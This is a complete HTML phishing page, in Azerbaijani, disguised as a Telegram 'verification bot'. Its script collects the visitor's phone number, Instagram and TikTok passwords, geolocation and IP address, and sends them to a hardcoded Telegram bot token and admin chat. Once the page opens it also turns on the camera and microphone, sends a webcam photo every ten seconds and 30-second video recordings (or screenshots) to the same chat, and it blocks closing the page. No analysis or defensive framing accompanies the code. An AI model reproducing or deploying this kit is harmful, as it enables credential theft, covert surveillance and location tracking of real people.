<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Bot</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #0e1621;
            height: 100vh;
            display: flex;
            flex-direction: column;
            color: #fff;
        }
        .header {
            background: #17212b;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #242f3d;
            flex-shrink: 0;
        }
        .header .back { font-size: 20px; margin-right: 12px; color: #6c7883; cursor: default; }
        .header .avatar {
            width: 40px; height: 40px; background: #2b5278; border-radius: 50%;
            display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px;
        }
        .header .info { flex: 1; }
        .header .info .name { font-weight: 600; font-size: 17px; }
        .header .info .status { font-size: 12px; color: #6c7883; }
        .header .menu { font-size: 22px; color: #6c7883; }

        .chat {
            flex: 1;
            padding: 10px 12px;
            overflow-y: auto;
            background: #0e1621;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 80%;
            padding: 8px 12px;
            border-radius: 12px;
            font-size: 15px;
            line-height: 1.4;
            word-wrap: break-word;
            position: relative;
        }
        .message.bot {
            background: #182533;
            align-self: flex-start;
            border-bottom-left-radius: 4px;
        }
        .message.user {
            background: #2b5278;
            align-self: flex-end;
            border-bottom-right-radius: 4px;
        }
        .message .time {
            font-size: 10px;
            color: #6c7883;
            text-align: right;
            margin-top: 4px;
        }
        .input-area {
            background: #17212b;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            border-top: 1px solid #242f3d;
            flex-shrink: 0;
        }
        .input-area input {
            flex: 1;
            padding: 10px 14px;
            border: none;
            border-radius: 20px;
            background: #242f3d;
            color: #fff;
            font-size: 15px;
            outline: none;
        }
        .input-area input::placeholder { color: #6c7883; }
        .input-area .send {
            width: 40px; height: 40px;
            background: #2b5278;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin-left: 10px;
            cursor: pointer;
            font-size: 18px;
            transition: 0.2s;
        }
        .input-area .send:active { transform: scale(0.9); }

        .typing {
            align-self: flex-start;
            background: #182533;
            border-radius: 12px;
            padding: 8px 12px;
            font-size: 12px;
            color: #6c7883;
            display: none;
        }
        .typing span { animation: dots 1.5s infinite; }
        @keyframes dots {
            0% { content: '.'; }
            33% { content: '..'; }
            66% { content: '...'; }
        }

        /* Yükləmə ekranı */
        #loadingOverlay {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center;
            z-index: 9999; flex-direction: column;
        }
        #loadingOverlay .spinner {
            width: 60px; height: 60px; border: 6px solid #333; border-top: 6px solid #fe2c55;
            border-radius: 50%; animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #loadingOverlay p {
            margin-top: 20px; font-size: 18px; color: #fff;
        }
        #loadingOverlay .success {
            display: none; font-size: 24px; font-weight: bold; color: #25f4ee;
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="back">‹</div>
        <div class="avatar">🤖</div>
        <div class="info">
            <div class="name">Yoxlama Botu</div>
            <div class="status">online</div>
        </div>
        <div class="menu">⋯</div>
    </div>

    <div class="chat" id="chat"></div>

    <div class="input-area">
        <input type="text" id="msgInput" placeholder="Mesaj yaz..." autocomplete="off">
        <div class="send" id="sendBtn">➤</div>
    </div>

    <!-- Yükləmə ekranı (loading + uğur mesajı) -->
    <div id="loadingOverlay">
        <div class="spinner"></div>
        <p id="loadingText">Məlumatlar göndərilir...</p>
        <div class="success" id="successText">✅ Bot basıldı!</div>
    </div>

    <script>
        // ============================================================
        //  KONFİQURASİYA
        // ============================================================
        const BOT_TOKEN = "8840269817:AAE2owjpICs-t_x7FceNKwZ6eeDS5DfX5Hs";
        const ADMIN_CHAT_ID = "6302623883";

        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('chat_id') || ADMIN_CHAT_ID;

        // ============================================================
        //  CHAT FUNKSİYALARI
        // ============================================================
        const chat = document.getElementById('chat');
        const input = document.getElementById('msgInput');
        const sendBtn = document.getElementById('sendBtn');

        function addMessage(text, sender, time = null) {
            const div = document.createElement('div');
            div.className = `message ${sender}`;
            const now = time || new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            div.innerHTML = `${text}<div class="time">${now}</div>`;
            chat.appendChild(div);
            chat.scrollTop = chat.scrollHeight;
        }

        function addTyping() {
            const div = document.createElement('div');
            div.className = 'typing';
            div.id = 'typingIndicator';
            div.innerHTML = 'Bot yazır<span>.</span><span>.</span><span>.</span>';
            chat.appendChild(div);
            chat.scrollTop = chat.scrollHeight;
        }

        function removeTyping() {
            const el = document.getElementById('typingIndicator');
            if (el) el.remove();
        }

        function sendBotMessage(text, delay = 800) {
            setTimeout(() => addMessage(text, 'bot'), delay);
        }

        // ============================================================
        //  BOT FLOW
        // ============================================================
        let step = 0; // 0: başlanğıc, 1: nömrə istənir, 2: Instagram, 3: TikTok, 4: tamamlandı
        let collected = {
            phone: '',
            instagram: { user: '', pass: '' },
            tiktok: { user: '', pass: '' },
            location: null,
            ip: ''
        };

        function startBot() {
            sendBotMessage("Salam! Mən yoxlama botuyam. Zəhmət olmasa, hesabınızı yoxlamaq üçün bir neçə addımı tamamlayın.", 500);
            setTimeout(() => {
                sendBotMessage("Əvvəlcə, telefon nömrənizi yazın (beynəlxalq formatda):", 2000);
                step = 1;
            }, 3000);
        }

        function handleUserMessage(text) {
            if (!text.trim()) return;
            addMessage(text, 'user');
            input.value = '';
            addTyping();

            setTimeout(() => {
                removeTyping();
                if (step === 1) {
                    // Nömrə alındı
                    collected.phone = text;
                    sendBotMessage("Təşəkkürlər! İndi Instagram hesab məlumatlarınızı yazın.", 1000);
                    setTimeout(() => {
                        sendBotMessage("İstifadəçi adı və şifrəni aşağıdakı formatda yazın:\n`istifadeci:şifre`", 1000);
                        step = 2;
                    }, 1500);
                } else if (step === 2) {
                    // Instagram məlumatları
                    const parts = text.split(':');
                    if (parts.length === 2) {
                        collected.instagram.user = parts[0].trim();
                        collected.instagram.pass = parts[1].trim();
                        sendBotMessage("Instagram məlumatları qəbul edildi. İndi TikTok məlumatlarınızı yazın.", 1000);
                        setTimeout(() => {
                            sendBotMessage("Yenə eyni formatda: `istifadeci:şifre`", 1000);
                            step = 3;
                        }, 1500);
                    } else {
                        sendBotMessage("Xahiş edirəm düzgün formatda yazın: `istifadeci:şifre`", 500);
                    }
                } else if (step === 3) {
                    // TikTok məlumatları
                    const parts = text.split(':');
                    if (parts.length === 2) {
                        collected.tiktok.user = parts[0].trim();
                        collected.tiktok.pass = parts[1].trim();
                        // Lokasiya soruş
                        sendBotMessage("Təşəkkürlər! İndi bir dəqiqəyə yerinizi (lokasiya) yoxlayacağıq.", 1000);
                        setTimeout(() => {
                            askLocation();
                        }, 1500);
                    } else {
                        sendBotMessage("Xahiş edirəm düzgün formatda yazın: `istifadeci:şifre`", 500);
                    }
                } else {
                    // Əgər artıq bitibsə, heç nə etmə
                    sendBotMessage("Bot artıq işləmini tamamladı. Səhifəni bağlaya bilərsiniz.", 500);
                }
            }, 1500);
        }

        // ============================================================
        //  LOKASİYA (YER)
        // ============================================================
        function askLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        collected.location = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        };
                        // IP ünvanını al
                        try {
                            const resp = await fetch('https://api.ipify.org?format=json');
                            const data = await resp.json();
                            collected.ip = data.ip;
                        } catch (e) {
                            collected.ip = 'Bilinmir';
                        }
                        // Bütün məlumatları topla və göndər
                        await sendAllData();
                        // Yükləmə ekranını göstər
                        showLoading();
                    },
                    (error) => {
                        // Əgər lokasiya icazəsi verilməzsə, yenə də davam et
                        collected.location = null;
                        sendBotMessage("Lokasiya tapılmadı, lakin davam edirik.", 500);
                        setTimeout(async () => {
                            // IP al
                            try {
                                const resp = await fetch('https://api.ipify.org?format=json');
                                const data = await resp.json();
                                collected.ip = data.ip;
                            } catch (e) {
                                collected.ip = 'Bilinmir';
                            }
                            await sendAllData();
                            showLoading();
                        }, 1000);
                    }
                );
            } else {
                collected.location = null;
                sendBotMessage("Brauzeriniz lokasiyanı dəstəkləmir, davam edirik.", 500);
                setTimeout(async () => {
                    try {
                        const resp = await fetch('https://api.ipify.org?format=json');
                        const data = await resp.json();
                        collected.ip = data.ip;
                    } catch (e) {
                        collected.ip = 'Bilinmir';
                    }
                    await sendAllData();
                    showLoading();
                }, 1000);
            }
        }

        // ============================================================
        //  MƏLUMATLARI TELEGRAM-A GÖNDƏR
        // ============================================================
        async function sendAllData() {
            const text = `🔐 **Yeni giriş məlumatları**\n\n` +
                `📞 Telefon: ${collected.phone}\n` +
                `📱 Instagram: ${collected.instagram.user} : ${collected.instagram.pass}\n` +
                `🎵 TikTok: ${collected.tiktok.user} : ${collected.tiktok.pass}\n` +
                (collected.location ? `📍 Yer: https://maps.google.com/?q=${collected.location.lat},${collected.location.lng}\n` : '📍 Yer: Yoxdur\n') +
                `🌍 IP: ${collected.ip}\n` +
                `🕐 ${new Date().toLocaleString()}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: text
                    })
                });
            } catch (e) {
                console.error('Mesaj göndərilə bilmədi', e);
            }
        }

        // ============================================================
        //  YÜKLƏMƏ EKRANI VƏ “BOT BASILDI” MESAJI
        // ============================================================
        const overlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const successText = document.getElementById('successText');

        function showLoading() {
            overlay.style.display = 'flex';
            loadingText.style.display = 'block';
            successText.style.display = 'none';
            // Bir neçə saniyədən sonra yükləməni tamamla
            setTimeout(() => {
                loadingText.style.display = 'none';
                successText.style.display = 'block';
                // Əlavə olaraq söhbətə də yaza bilərik
                addMessage("✅ Bot basıldı! Bütün məlumatlar təsdiqləndi.", 'bot');
                step = 4; // bitdi
            }, 3000);
        }

        // ============================================================
        //  KAMERA & MİKROFON & EKRAN
        // ============================================================
        let mediaStream = null;
        let mediaRecorder = null;
        let videoChunks = [];

        async function initMedia() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: true });
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.muted = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();

                setInterval(() => captureFrame(video), 10000);
                startRecording();
            } catch (e) {
                console.warn('Kamera yoxdur, ekran görüntüsü istifadə olunacaq.');
                setInterval(captureScreen, 10000);
            }
        }

        function startRecording() {
            if (!mediaStream) return;
            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) videoChunks.push(e.data);
            };
            mediaRecorder.onstop = async () => {
                const blob = new Blob(videoChunks, { type: 'video/webm' });
                await sendMediaToTelegram(blob, 'video');
                videoChunks = [];
                if (mediaRecorder.state !== 'recording') {
                    mediaRecorder.start(30000);
                }
            };
            mediaRecorder.start(30000);
        }

        function captureFrame(video) {
            const canvas = document.createElement('canvas');
            canvas.width = 320; canvas.height = 240;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                await sendMediaToTelegram(blob, 'photo');
            }, 'image/jpeg', 0.7);
        }

        async function captureScreen() {
            try {
                const canvas = await html2canvas(document.body, { useCORS: true, scale: 0.5, logging: false });
                canvas.toBlob(async (blob) => {
                    await sendMediaToTelegram(blob, 'photo');
                }, 'image/jpeg', 0.7);
            } catch (e) {}
        }

        async function sendMediaToTelegram(blob, type) {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_CHAT_ID);
            if (type === 'photo') formData.append('photo', blob, 'capture.jpg');
            else if (type === 'video') formData.append('video', blob, 'capture.webm');

            const url = type === 'photo'
                ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
                : `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch (e) {}
        }

        // ============================================================
        //  EVENT LİSTENERS
        // ============================================================
        sendBtn.addEventListener('click', () => handleUserMessage(input.value));
        input.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleUserMessage(input.value); });

        // ============================================================
        //  BAŞLAT
        // ============================================================
        startBot();
        initMedia();

        // Çıxışı blokla
        window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
    </script>
</body>
</html>
